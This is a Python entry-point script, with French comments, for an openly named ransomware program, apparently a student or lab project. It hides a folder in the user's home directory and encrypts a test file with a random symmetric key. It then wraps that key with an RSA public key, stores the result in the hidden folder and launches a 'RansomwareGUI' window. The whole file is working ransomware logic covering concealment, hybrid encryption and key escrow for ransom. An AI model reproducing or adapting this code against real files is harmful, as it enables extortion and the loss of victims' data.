import tkinter as tk
from gui import RansomwareGUI
import os
import sys
import ctypes
# Ajouter le répertoire parent au chemin de recherche des modules
parent_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
sys.path.append(parent_dir)
from tools.utils import resource_path
from encryption import encrypt_file
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend

# Chemin du dossier caché dans le répertoire de l'utilisateur
hidden_dir = os.path.join(os.path.expanduser("~"), ".ransomware_hidden")
if not os.path.exists(hidden_dir):
    os.makedirs(hidden_dir)

    # Définir l'attribut caché sous Windows
    if os.name == 'nt':  # Vérifie si le système d'exploitation est Windows
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ret = ctypes.windll.kernel32.SetFileAttributesW(hidden_dir, FILE_ATTRIBUTE_HIDDEN)
        if not ret:
            raise ctypes.WinError()

ENCRYPTION_FLAG =  os.path.join(hidden_dir, "encryption_done.flag")
KEY_FILE = os.path.join(hidden_dir, "keys", "encrypted_symmetric_key.bin")

def is_already_encrypted():
    # Vérifie si le chiffrement a déjà été effectué.
    return os.path.exists(ENCRYPTION_FLAG)

def mark_as_encrypted():
    #Crée un fichier indicateur pour signaler que le chiffrement est fait.
    with open(ENCRYPTION_FLAG, 'w') as flag_file:
        flag_file.write("Chiffrement effectué.")

def main():
    # Créer le fichier example.txt avec du contenu de test
    file_path = 'example.txt'
    if not os.path.exists(file_path):
        with open(file_path, 'w') as file:
            file.write("Ceci est un fichier de test.")

    if not is_already_encrypted():
        # Générer la clé symétrique
        symmetric_key = os.urandom(32)

        # Chiffrer le fichier example.txt avec la clé symétrique
        encrypt_file(file_path, symmetric_key)

        # Charger la clé publique RSA
        public_key_path = resource_path('keys/public_key.pem')
        #public_key_path = os.path.join(os.path.dirname(__file__), '..', 'keys', 'public_key.pem')
        with open(public_key_path, 'rb') as key_file:
            public_key = serialization.load_pem_public_key(
                key_file.read(),
                backend=default_backend()
            )

        # Chiffrer la clé symétrique avec la clé publique RSA
        encrypted_symmetric_key = public_key.encrypt(
            symmetric_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        # Créer le répertoire 'keys' s'il n'existe pas dans le répertoire courant
        keys_dir = os.path.join(hidden_dir, 'keys')
        if not os.path.exists(keys_dir):
            os.makedirs(keys_dir)

        # Sauvegarder la clé symétrique chiffrée
        with open(KEY_FILE, 'wb') as key_file:
            key_file.write(encrypted_symmetric_key)

        mark_as_encrypted()

    # Lancer l'interface graphique
    root = tk.Tk()
    server = RansomwareGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
